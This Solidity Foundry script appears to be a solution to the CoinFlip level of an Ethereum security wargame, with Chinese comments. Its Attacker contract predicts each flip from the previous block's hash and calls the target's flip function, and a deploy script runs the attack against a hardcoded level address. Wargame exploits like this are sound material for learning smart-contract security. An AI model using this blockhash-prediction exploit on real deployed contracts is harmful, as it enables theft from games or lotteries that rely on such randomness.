// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "../src/level03/CoinFlip.sol";

contract Attacker {
    address targetAddr;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack() public payable {
        CoinFlip target = CoinFlip(payable(targetAddr));

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);
    }

    receive() external payable {}
}

contract CallContractScript is Script {
    // 假设合约已经部署在这个地址

    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x7ECf6bB565c69ccfac8F5d4b3D785AB78a00F677;

        Attacker attacker = new Attacker(payable(levelAddr));
        
        // 攻击合约发动攻击
        attacker.attack();

        vm.stopBroadcast();
    }
}
